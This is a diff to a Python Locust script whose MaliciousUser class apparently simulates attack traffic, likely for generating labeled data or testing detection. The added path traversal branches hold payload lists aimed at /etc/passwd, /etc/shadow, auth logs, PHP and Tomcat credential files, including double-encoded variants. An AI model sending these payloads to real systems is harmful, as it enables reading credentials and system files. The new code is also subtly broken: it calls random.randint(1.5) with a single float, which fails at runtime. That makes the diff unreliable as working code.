@@ -82,20 +82,63 @@ class MaliciousUser(FastHttpUser):
 
         for username in usernames:
             for password in passwords:
-                self.setrandom()
+                self.randomuser()
                 self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")
 
     @task(1)
     def path_traversal_attempt(self):
-        payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\win.ini",
-            "....//....//....//etc/hosts",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd",
-        ]
-        payload = random.choice(payloads)
-        self._log_request("GET", f"/static/{payload}", None, "path_traversal")
+        choice = random.randint(1,3)
+        if choice == 1:
+            retries = random.randint(1.5)
+            for _ in range(retries):
+                self.randomuser()
+                payloads = [
+                    "../../../etc/passwd",
+                    "..\\..\\..\\windows\\win.ini",
+                    "....//....//....//etc/hosts",
+                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                    "..%252f..%252f..%252fetc%252fpasswd",
+                ]
+                payload = random.choice(payloads)
+                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
+        if choice == 2:
+            retries = random.randint(1.5)
+            for _ in range(retries):
+                self.randomuser()
+                payloads = [
+                    "../../../etc/passwd",
+                    "..\\..\\..\\windows\\win.ini",
+                    "....//....//....//etc/hosts",
+                    "../../../var/log/auth.log",                # Linux auth logs
+                    "../../../var/www/html/config.php",          # PHP config files
+                    "..\\..\\..\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat",  # Windows user data
+                    "..\\..\\..\\Program Files\\Common Files\\system\\ole db\\msdasqlr.dll",  # Windows DLL
+                    "../../../etc/shadow",                      # Linux shadow file
+                    "../../../opt/tomcat/conf/tomcat-users.xml" # Tomcat configuration
+                ]
+                encoded_payloads = [
+                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                    "..%252f..%252f..%252fetc%252fpasswd",
+                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
+                ]
+            
+                payload = random.choice(payloads + encoded_payloads)
+                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
+        if choice == 3:
+            retries = random.randint(1.5)
+            for _ in range(retries):
+                depth = random.randint(1, 6)
+                traversal = "../" * depth
+                file_target = random.choice([
+                    "etc/passwd", 
+                    "etc/hosts", 
+                    "var/log/apache2/access.log", 
+                    "windows/win.ini"
+                ])
+                
+                payload = f"{traversal}{file_target}"
+                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
+
 
     @task(1)
     def command_injection_attempt(self):
@@ -111,13 +154,33 @@ class MaliciousUser(FastHttpUser):
 
     @task(2)
     def web_scraping(self):
-        pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
-        for page in pages:
-            self._log_request("GET", page, None, "web_scraping")
+        randomuser = random.randint(1,2)
+        choice = random.randint(1,3)
+        if choice == 1:
+            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", "/information", "/aboutus"]
+            for page in pages:
+                self.randomuser()
+                self._log_request("GET", page, None, "web_scraping")
+                time.sleep(random.uniform(1, 3))  # Simulate browsing time
+        elif choice == 2:
+            search_terms = ["laptop", "phone", "book", "shirt", "headphones", "tablet", "watch", "camera", "shoes", "jacket", "backpack", "sunglasses", "speaker", "smartwatch", "keyboard", "mouse", "charger", "t-shirt", "monitor", "desk"]
+            pages = ["/products", "/categories", "/reviews", "/comments", "/information"]
+            for term in search_terms:
+                page = random.choice(pages)
+                if randomuser == 1:
+                    self.randomuser()
+                data = {"search_term": term}
+                self._log_request("POST", page, data, "web_scraping")
+
+                time.sleep(random.uniform(1, 3))  # Simulate browsing time
+        elif choice == 3:
+            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
+            for page in pages:
+                self._log_request("GET", page, None, "web_scraping")
+                time.sleep(random.uniform(1, 3))  # Simulate browsing time
 
     @task(2)
     def ddos_simulation(self):
-
         randomuser = random.randint(1,2)
         for _ in range(random.randint(5, 15)):
             # Randomize user_id, session_id, client_ip, and user_agent
